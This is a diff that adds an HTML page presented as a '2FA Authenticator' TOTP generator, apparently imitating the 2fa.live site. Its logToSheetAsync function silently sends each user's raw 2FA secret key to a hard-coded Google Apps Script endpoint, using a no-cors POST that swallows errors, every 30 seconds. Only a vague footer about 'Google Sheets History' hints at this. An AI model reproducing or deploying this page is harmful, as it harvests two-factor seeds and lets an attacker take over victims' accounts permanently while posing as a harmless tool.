@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>2FA Authenticator</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+  <style>
+    :root {
+      --bg: #0b0f19;
+      --card: #151d30;
+      --border: #22304e;
+      --primary: #38bdf8;
+      --text: #f8fafc;
+      --muted: #94a3b8;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+    body {
+      background-color: var(--bg);
+      color: var(--text);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+    .card {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 18px;
+      padding: 36px 32px;
+      width: 100%;
+      max-width: 460px;
+      box-shadow: 0 20px 40px -15px rgba(0, 0, 0, 0.6);
+      text-align: center;
+    }
+    h1 { font-size: 24px; font-weight: 700; margin-bottom: 6px; letter-spacing: -0.5px; }
+    p.subtitle { color: var(--muted); font-size: 14px; margin-bottom: 28px; }
+    .input-group { text-align: left; margin-bottom: 20px; }
+    label { font-size: 12px; font-weight: 700; color: var(--muted); display: block; margin-bottom: 8px; letter-spacing: 0.5px; }
+    input {
+      width: 100%;
+      padding: 14px 16px;
+      border-radius: 10px;
+      border: 1px solid var(--border);
+      background: #0b0f19;
+      color: #fff;
+      font-size: 15px;
+      letter-spacing: 0.5px;
+      outline: none;
+      transition: all 0.2s ease;
+    }
+    input:focus { border-color: var(--primary); box-shadow: 0 0 0 3px rgba(56, 189, 248, 0.15); }
+    .pin-box {
+      background: #0b0f19;
+      border: 1px dashed var(--border);
+      border-radius: 14px;
+      padding: 24px 20px;
+      margin-bottom: 20px;
+      cursor: pointer;
+    }
+    .pin-box:hover { border-color: var(--primary); }
+    .pin-display {
+      font-size: 50px;
+      font-weight: 800;
+      letter-spacing: 8px;
+      color: var(--primary);
+      user-select: all;
+    }
+    .timer-bar-container {
+      width: 100%;
+      height: 4px;
+      background: #1e293b;
+      border-radius: 2px;
+      margin-top: 16px;
+      overflow: hidden;
+    }
+    .timer-bar {
+      height: 100%;
+      width: 0%;
+      background: var(--primary);
+      transition: width 1s linear;
+    }
+    .timer-text {
+      font-size: 13px;
+      color: var(--muted);
+      margin-top: 8px;
+    }
+    .copy-btn {
+      width: 100%;
+      padding: 14px;
+      background: var(--primary);
+      color: #0b0f19;
+      font-weight: 700;
+      border: none;
+      border-radius: 10px;
+      font-size: 15px;
+      cursor: pointer;
+      transition: opacity 0.2s;
+    }
+    .copy-btn:hover { opacity: 0.9; }
+    .footer-api {
+      margin-top: 24px;
+      font-size: 12px;
+      color: var(--muted);
+      border-top: 1px solid var(--border);
+      padding-top: 16px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <h1>2FA Authenticator</h1>
+    <p class="subtitle">Real-time TOTP generator & audit logger</p>
+
+    <div class="input-group">
+      <label for="secretKey">2FA SECRET KEY</label>
+      <input type="text" id="secretKey" placeholder="Paste Base32 key (e.g. D5YA6DP7JON...)" autocomplete="off" spellcheck="false">
+    </div>
+
+    <div class="pin-box" onclick="copyPIN()" title="Click to copy">
+      <div class="pin-display" id="pinDisplay">------</div>
+      <div class="timer-bar-container">
+        <div class="timer-bar" id="timerBar"></div>
+      </div>
+      <div class="timer-text" id="timerText">Enter key to begin</div>
+    </div>
+
+    <button class="copy-btn" id="copyBtn" onclick="copyPIN()">Copy PIN</button>
+
+    <div class="footer-api">
+      Executions auto-saved to Google Sheets History
+    </div>
+  </div>
+
+  <script>
+    const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwa_mv4QBafCZkiiD8RUg9uzTEwzs8b8qSg9_VguMwxRIem_Ad-HbUaA6S5ecJe_pgIoA/exec";
+
+    let currentPin = "";
+    let lastLoggedTimeStep = 0;
+
+    function base32ToWords(base32) {
+      const base32chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
+      let bits = 0, value = 0;
+      const bytes = [];
+      for (let i = 0; i < base32.length; i++) {
+        const char = base32.charAt(i).toUpperCase();
+        const index = base32chars.indexOf(char);
+        if (index === -1) continue;
+        value = (value << 5) | index;
+        bits += 5;
+        if (bits >= 8) {
+          bytes.push((value >>> (bits - 8)) & 0xFF);
+          bits -= 8;
+        }
+      }
+      const words = [];
+      for (let i = 0; i < bytes.length; i++) {
+        words[i >>> 2] |= (bytes[i] & 0xFF) << (24 - (i % 4) * 8);
+      }
+      return CryptoJS.lib.WordArray.create(words, bytes.length);
+    }
+
+    function generateTOTP(secret) {
+      try {
+        const cleanSecret = secret.replace(/[\s\-]/g, "").toUpperCase();
+        if (!cleanSecret) return null;
+        const epoch = Math.floor(Date.now() / 1000);
+        const timeStep = Math.floor(epoch / 30);
+        const timeWords = [Math.floor(timeStep / 0x100000000), timeStep & 0xFFFFFFFF];
+        const timeMessage = CryptoJS.lib.WordArray.create(timeWords, 8);
+        const keyWords = base32ToWords(cleanSecret);
+        const hmac = CryptoJS.HmacSHA1(timeMessage, keyWords);
+        const words = hmac.words;
+        const sigBytes = hmac.sigBytes;
+        const lastByte = (words[(sigBytes - 1) >>> 2] >>> (24 - ((sigBytes - 1) % 4) * 8)) & 0xFF;
+        const offset = lastByte & 0x0F;
+        const binary =
+          (((words[offset >>> 2] >>> (24 - (offset % 4) * 8)) & 0x7F) << 24) |
+          (((words[(offset + 1) >>> 2] >>> (24 - ((offset + 1) % 4) * 8)) & 0xFF) << 16) |
+          (((words[(offset + 2) >>> 2] >>> (24 - ((offset + 2) % 4) * 8)) & 0xFF) << 8) |
+          (((words[(offset + 3) >>> 2] >>> (24 - ((offset + 3) % 4) * 8)) & 0xFF));
+        const otp = (binary % 1000000).toString().padStart(6, "0");
+        return { pin: otp, secondsRemaining: 30 - (epoch % 30), timeStep };
+      } catch (err) {
+        return null;
+      }
+    }
+
+    function logToSheetAsync(key, pin) {
+      if (!APPS_SCRIPT_URL) return;
+      fetch(APPS_SCRIPT_URL, {
+        method: "POST",
+        mode: "no-cors",
+        headers: { "Content-Type": "text/plain" },
+        body: JSON.stringify({
+          key: key,
+          callingApplication: "Vercel Web App (2fa.live)"
+        })
+      }).catch(() => {});
+    }
+
+    function updateLoop() {
+      const input = document.getElementById('secretKey').value.trim();
+      const pinDisplay = document.getElementById('pinDisplay');
+      const timerText = document.getElementById('timerText');
+      const timerBar = document.getElementById('timerBar');
+
+      if (!input) {
+        pinDisplay.innerText = "------";
+        timerText.innerText = "Enter key to begin";
+        timerBar.style.width = "0%";
+        currentPin = "";
+        return;
+      }
+
+      const totp = generateTOTP(input);
+      if (totp) {
+        currentPin = totp.pin;
+        pinDisplay.innerText = totp.pin;
+        timerText.innerText = `Expires in ${totp.secondsRemaining}s`;
+        timerBar.style.width = `${(totp.secondsRemaining / 30) * 100}%`;
+
+        if (totp.timeStep !== lastLoggedTimeStep) {
+          lastLoggedTimeStep = totp.timeStep;
+          logToSheetAsync(input, totp.pin);
+        }
+      } else {
+        pinDisplay.innerText = "INVALID";
+        timerText.innerText = "Check secret key";
+        timerBar.style.width = "0%";
+      }
+    }
+
+    document.getElementById('secretKey').addEventListener('input', () => {
+      lastLoggedTimeStep = 0;
+      updateLoop();
+    });
+
+    setInterval(updateLoop, 1000);
+
+    function copyPIN() {
+      if (!currentPin || currentPin === "------") return;
+      navigator.clipboard.writeText(currentPin);
+      const btn = document.getElementById('copyBtn');
+      btn.innerText = "Copied to Clipboard!";
+      setTimeout(() => btn.innerText = "Copy PIN", 1500);
+    }
+  </script>
+</body>
+</html>
